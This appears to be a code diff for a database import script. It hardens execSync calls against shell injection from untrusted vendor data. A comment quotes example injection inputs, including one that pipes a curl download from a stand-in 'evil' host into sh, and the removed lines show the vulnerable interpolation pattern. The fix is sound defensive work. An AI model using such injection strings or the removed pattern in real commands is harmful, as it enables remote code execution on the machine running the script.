@@ -135,19 +135,21 @@ for (const t of normalized) {
 // --- Step 5: query existing DB, filter out already-present (mfr, model) ------
 console.log(`\n${validated.length} validated templates. Checking DB for existing models...`);
 
-const manufacturers = [...new Set(validated.map((v) => v.input.manufacturer!.trim().toLowerCase()))];
 const existingIds = new Map<string, string>(); // key -> existing template id (UUID)
 const flag = isRemote ? "--remote" : "--local";
 
-for (const mfr of manufacturers) {
-  // single-quote SQL literal; escape embedded quotes.
-  const mfrEsc = mfr.replace(/'/g, "''");
-  const cmd = `npx wrangler d1 execute easyschematic-db ${flag} --json --command="SELECT id, lower(manufacturer)||'::'||lower(model_number) AS k FROM templates WHERE lower(manufacturer)='${mfrEsc}'"`;
+// Fetch all existing (manufacturer::model) keys in ONE query. We deliberately do
+// NOT interpolate manufacturer names into the shell command — vendor JSON is
+// untrusted, and embedding it in the --command string is a shell-injection vector
+// (a name like `x";curl evil|sh;"` or `x$(...)` would execute). Filtering to our
+// import set is done client-side below instead.
+{
+  const cmd = `npx wrangler d1 execute easyschematic-db ${flag} --json --command="SELECT id, lower(manufacturer)||'::'||lower(model_number) AS k FROM templates WHERE manufacturer IS NOT NULL AND model_number IS NOT NULL"`;
   const out = execSync(cmd, { cwd: apiDir, encoding: "utf-8" });
   const parsed = JSON.parse(out);
   const rows: { id: string; k: string }[] = parsed[0]?.results ?? [];
   for (const r of rows) existingIds.set(r.k, r.id);
-  console.log(`  ${mfr}: ${rows.length} existing in DB`);
+  console.log(`  ${rows.length} existing manufacturer/model rows in DB`);
 }
 
 // Split validated rows into fresh inserts vs updates.
@@ -234,7 +236,14 @@ updates.forEach(({ id, input }) => {
   );
 });
 
-const vendor = (validated[0]?.input.manufacturer ?? "vendor").toLowerCase().replace(/\s+/g, "-");
+// Sanitize to [a-z0-9-] only — this becomes part of a filename passed to a shell
+// (execSync --file below), so any shell metacharacter from the manufacturer name
+// must be stripped, not just whitespace collapsed.
+const vendor =
+  (validated[0]?.input.manufacturer ?? "vendor")
+    .toLowerCase()
+    .replace(/[^a-z0-9]+/g, "-")
+    .replace(/^-+|-+$/g, "") || "vendor";
 const timestamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
 const sqlPath = path.join(__dirname, `import-${vendor}-${timestamp}.sql`);
 writeFileSync(sqlPath, lines.join("\n"), "utf-8");
@@ -258,7 +267,7 @@ if (dryRun) {
 }
 
 console.log(`\nApplying to D1 (${flag})...`);
-execSync(`npx wrangler d1 execute easyschematic-db ${flag} --file=${path.relative(apiDir, sqlPath)}`, {
+execSync(`npx wrangler d1 execute easyschematic-db ${flag} --file="${path.relative(apiDir, sqlPath)}"`, {
   cwd: apiDir,
   stdio: "inherit",
 });
